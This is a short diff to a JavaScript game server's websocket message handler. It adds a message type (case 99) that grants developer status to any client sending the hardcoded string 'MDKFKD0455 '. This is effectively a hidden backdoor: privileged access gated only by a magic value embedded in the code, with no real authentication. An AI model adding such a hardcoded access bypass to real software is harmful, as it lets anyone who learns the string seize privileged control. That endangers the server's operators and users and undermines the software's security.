@@ -449,6 +449,16 @@ function gameserver(port) {
 								new sclick(aobjids, ws.player.id, self.entities)
 							}
 							break
+								case 99:
+
+							var nameLen = MsgReader.readUInt16();
+
+							var ad = util.decode_utf8(MsgReader.readName((nameLen)));
+							if (ad == "MDKFKD0455 ") {
+
+								ws.isdeveloper = true
+							}
+							break
 						case 24:
 							if (!ws.exists) return;
 							let which = MsgReader.readUInt8();
